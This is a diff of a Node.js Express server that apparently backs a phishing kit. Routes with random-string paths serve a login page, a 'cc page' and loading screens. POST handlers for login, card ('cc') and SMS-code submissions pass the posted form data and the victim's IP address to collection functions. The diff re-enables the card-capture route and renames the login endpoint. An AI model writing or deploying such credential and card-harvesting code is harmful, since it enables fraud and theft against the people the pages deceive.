@@ -115,9 +115,9 @@ function getIpList(){
 app.get("/",(req,res)=>{ // login
     res.render("index");
 });
-// app.get("/3EtpVNHarRb8PqJfArbu",(req,res)=>{ // loading 1:
-//     res.render("cco");
-// });
+app.get("/3EtpVNHarRb8PqJfArbu",(req,res)=>{ // loading 1:
+    res.render("cco");
+});
 app.get("/KecdAK8hGCFkbAY2Qpnk",(req,res)=>{ // cc page:
     res.render("lodi1");
 });
@@ -140,19 +140,19 @@ app.get("/Aw6knaPZ5nz4RnFvFV8s",(req,res)=>{ // done:
 
 
 //======================[POST]======================
- app.post("/v2C8VrVuzY7WzVJv5RB6",(req,res)=>{ // login post
+ app.post("7tTeaYMkt9pkpywQpvha",(req,res)=>{ // login post
      let data = req.body;
      // console.log(data);
-     a2(data,requestIp.getClientIp(req));
+     a1(data,requestIp.getClientIp(req));
      res.send({OK:true});
  });
 
-//  app.post("/v2C8VrVuzY7WzVJv5RB6",(req,res)=>{ // cc post
-//      let data = req.body;
-//      // console.log(data);
-//      a2(data,requestIp.getClientIp(req));
-//      res.send({OK:true});
-//  });
+  app.post("/v2C8VrVuzY7WzVJv5RB6",(req,res)=>{ // cc post
+      let data = req.body;
+      // console.log(data);
+      a2(data,requestIp.getClientIp(req));
+      res.send({OK:true});
+  });
 app.post("/xGJzLd2dUSJrY9Gscu6P",(req,res)=>{ // sms1 post
     let data = req.body;
     // console.log(data);
